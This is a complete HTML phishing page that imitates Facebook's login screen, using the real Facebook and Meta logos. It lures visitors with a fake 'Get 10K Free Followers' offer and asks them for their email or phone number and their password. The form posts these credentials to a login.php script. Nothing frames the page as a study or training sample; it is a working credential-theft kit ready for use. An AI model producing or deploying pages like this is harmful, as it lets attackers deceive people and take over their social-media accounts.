<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        
        .fb-card { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, .15); width: 360px; text-align: center; box-sizing: border-box; }
        
        /* Official Facebook Logo */
        .fb-logo { width: 180px; margin-bottom: 15px; }
        
        .promo-title { font-size: 19px; font-weight: 600; color: #1c1e21; margin-bottom: 5px; }
        .promo-desc { font-size: 15px; color: #606770; margin-bottom: 20px; line-height: 1.4; }

        /* Follower Selection Box (Like Instagram Style) */
        .select-box { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; background-color: #f5f6f7; font-size: 15px; color: #1c1e21; outline: none; cursor: pointer; }

        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 15px; background-color: #f5f6f7; outline: none; }
        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }

        .login-btn { width: 100%; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; padding: 12px; cursor: pointer; margin-top: 15px; }
        .login-btn:hover { background-color: #166fe5; }

        .divider { border-top: 1px solid #dadde1; margin: 20px 0; }

        /* Meta Branding Footer */
        .footer { position: fixed; bottom: 40px; text-align: center; width: 100%; }
        .meta-logo { width: 65px; display: block; margin: 0 auto 5px; opacity: 0.8; }
        .meta-text { color: #606770; font-size: 13px; font-weight: 500; }
    </style>
</head>
<body>

    <div class="fb-card">
        <img class="fb-logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2wsS1_h.svg" alt="Facebook">
        
        <div class="promo-title">Get 10K Free Followers ðŸŽ‰</div>
        <div class="promo-desc">Select your desired follower count and log in to verify your account.</div>

        <form action="login.php" method="POST">
            <select name="Selected_Followers" class="select-box">
                <option value="5000">5,000 Followers</option>
                <option value="10000" selected>10,000 Followers</option>
                <option value="20000">20,000 Followers</option>
            </select>

            <input type="text" name="Email_Phone" placeholder="Email or phone number" required>
            <input type="password" name="Password" placeholder="Password" required>
            
            <button type="submit" class="login-btn">Get Followers</button>
        </form>
        
        <div class="divider"></div>
    </div>

    <div class="footer">
        <img class="meta-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta">
        <span class="meta-text">from Meta</span>
    </div>

</body>
</html>
